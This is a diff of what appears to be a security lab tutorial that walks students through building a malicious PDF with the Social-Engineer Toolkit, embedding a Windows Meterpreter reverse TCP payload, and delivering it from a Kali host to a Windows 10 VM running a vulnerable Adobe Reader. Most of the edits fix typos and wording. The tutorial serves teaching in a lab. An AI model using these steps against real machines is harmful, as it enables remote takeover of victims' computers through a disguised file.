@@ -240,23 +240,23 @@ Download and install a vulnerable version of Adobe Reader to the Windows 10 vm. 
     * `1) Social-Engineering Attacks`
     * `3) Infectious Media Generator`
     * `1) File-Format Exploits`
-    * enter kali ip address
+    * Enter the Kali IP address: `192.168.55.101`
     * `13) Adobe PDF Embedded EXE Social Engineering`
-    * `2. Use built-in BLANK PDF for attack` (unless you're feelinga adventurous, in which case you can create your own)
+    * `2. Use built-in BLANK PDF for attack` (unless you're feeling adventurous, in which case you can create your own)
     * `2) Windows Meterpreter Reverse_TCP`
-    * Accept default for payload listener LHOST
-    * Accept default for port to connect back on
-    * Let `set` create a listener right now (`yes`)
+    * Accept default for payload listener LHOST by pressing enter.
+    * Accept default for port to connect back on by pressing enter.
+    * Let `SET` create a listener right now (`yes`)
     
 2.  SET will have put the created payload in `/root/.set/template.pdf`. Your goal now is to get this pdf onto the victim machine. 
-    If you still have the python server running in the `/tmp` dir from the fake adobeupdate part of this lab, then you can just move this payload there and download it
-    to the victim machine as before. From a different Kali terminal than the `set` one:
+    If you still have the Python server running in the `/tmp` dir from the fake adobeupdate part of this lab, then you can just move this payload there and download it
+    to the victim machine as before. From a different Kali terminal than the `SET` one:
     
         mv /root/.set/template.pdf /tmp
         
     You can rename it to whatever you like.
     
-3.  On the victim machine, open the downloaded file with Adobe Reader
+3.  On the Windows 10 VM, save the PDF to the desktop by browsing to `http://192.168.55.101:8888`. Open the downloaded file with Adobe Reader
 
     * Right-click the downloaded file > `Open with...` > 'Adobe Reader 9.0`
     
